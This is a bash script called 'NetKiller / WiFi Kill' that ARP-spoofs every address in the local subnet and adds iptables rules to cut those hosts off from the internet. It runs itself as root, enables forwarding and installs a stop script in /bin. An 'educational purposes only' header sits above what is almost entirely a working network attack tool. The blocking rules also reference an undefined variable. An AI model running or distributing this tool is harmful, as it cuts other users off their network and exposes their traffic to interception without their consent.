#!/bin/bash

# ARP Spoofing Internet Blocker (Educational Purposes Only)
# Targets all possible IPs in subnet (without scanning)
# Requires: dsniff, iptables, ipcalc

echo -e "\e[1;91m"
echo "

       ███╗   ██╗███████╗████████╗██╗  ██╗██╗██╗     ██╗     ███████╗██████╗
       ████╗  ██║██╔════╝╚══██╔══╝██║ ██╔╝██║██║     ██║     ██╔════╝██╔══██╗
       ██╔██╗ ██║█████╗     ██║   █████╔╝ ██║██║     ██║     █████╗  ██████╔╝
       ██║╚██╗██║██╔══╝     ██║   ██╔═██╗ ██║██║     ██║     ██╔══╝  ██╔══██╗
       ██║ ╚████║███████╗   ██║   ██║  ██╗██║███████╗███████╗███████╗██║  ██║
       ╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                       WiFi Kill
"
echo -e "\e[1;92m                           Author: [x!v3r] github.com/xiv3r \e[0m"
echo -e "\e[0m"

# Check if script is running as root
if [[ $EUID -ne 0 ]]; then
    exec sudo "$0" "$@"
fi

# Enable IP forwarding and blocking rules
echo 1 > /proc/sys/net/ipv4/ip_forward
echo 1 > /proc/sys/net/ipv4/conf/all/forwarding
iptables -I FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT

# Create stop script
cat > /bin/netkiller-stop << 'EOF'
#!/bin/sh

echo " "
echo "Netkiller is Stop..."
echo " "
iptables -t mangle -F FORWARD
iptables -F FORWARD
pkill -f arpspoof
pkill arpspoof
echo " "
EOF
chmod 755 /bin/netkiller-stop

# Detect Network Configuration
WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
MASK=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
IP_CIDR=$(ip -4 addr show "$WLAN" | grep -oP 'inet \K[\d./]+')
CIDR=$(ipcalc -n "$IP_CIDR" | grep "Network:" | awk '{print $2}')

echo ""
echo "Current Network Configuration"
echo "INTERFACE: | $WLAN"
echo "GATEWAY:   | $GW"
echo "DEVICE IP: | $IP"
echo "TARGET:    | $CIDR"
echo ""

# Detect Interface
echo "Enter Wireless Interface: Skip for default"
read -r -p "> $WLAN " WLN
INTERFACE="${WLN:-$WLAN}"
echo ""

# Detect Gateway IP
echo "Enter Router Gateway IP: Skip for default"
read -r -p "> $GW " INET
GATEWAY="${INET:-$GW}"
echo ""

# Detect Subnet
echo "Enter Subnet mask: Skip for default"
read -r -p "> $CIDR " IPS
TARGET_SUBNET="${IPS:-$CIDR}"
echo ""

# Detect Device IP
echo "Enter Device IP: Skip for default"
read -r -p "> $IP " DEVIP
MYIP="${DEVIP:-$IP}"
echo ""

# Prompt configuration
echo "Target Network Configuration"
echo "INTERFACE: | $INTERFACE"
echo "GATEWAY:   | $GATEWAY"
echo "DEVICE IP: | $MYIP"
echo "TARGETS:   | $CIDR"
echo ""

# Prompt the user for confirmation
read -p "[*] Do you want to scan the network? (y/n) " -n 1 -r
echo

if [[ $REPLY =~ ^[Yy]$ ]]
then

# Run arp-scan to scan the target
echo ""
echo "[*] [ Scanning for Target ] [*]"
echo""
    # Execute the command if user answered 'y' or 'Y'
    arp-scan --retry=5 --bandwidth=100000 --random --localnet --interface="$WLAN"
else
    # Skip if user answered anything else
    echo "[*] Skipping..."
fi

# Function to expand a subnet to individual IPs (using ipcalc)
expand_subnet() {
    SUBNET=$1
    IFS='/' read -r IP MASK <<< "$SUBNET"
    ipcalc -n -b "$SUBNET" | awk '/HostMin/ {start=$2} /HostMax/ {end=$2} END {if(start && end) print start, end}'
}

# Expand subnet
read -r HOSTMIN HOSTMAX < <(expand_subnet "$TARGET_SUBNET")
if [[ -n "$HOSTMIN" && -n "$HOSTMAX" ]]; then
    # Convert IPs to integers
    ip2int() {
        local a b c d
        IFS=. read -r a b c d <<< "$1"
        echo "$((a*256**3 + b*256**2 + c*256 + d))"
    }
    int2ip() {
        local ip=$1
        echo "$((ip>>24&255)).$((ip>>16&255)).$((ip>>8&255)).$((ip&255))"
    }
    START=$(ip2int "$HOSTMIN")
    END=$(ip2int "$HOSTMAX")
    for ((i=START; i<=END; i++)); do
        TARGET_IP=$(int2ip "$i")
        ( arpspoof -i "$INTERFACE" -t "$TARGET_IP" -r "$GATEWAY" >/dev/null 2>&1 ) &
          iptables -t mangle -A FORWARD -s "$TARGET" -j TTL --ttl-set 0
          iptables -A FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
          iptables -A FORWARD -s "$TARGET" -j REJECT --reject-with icmp-host-unreachable
    done
fi
echo "Netkiller kill all the possible hosts in $TARGET_SUBNET"
echo " "
echo "To stop, Type: sudo netkiller-stop"
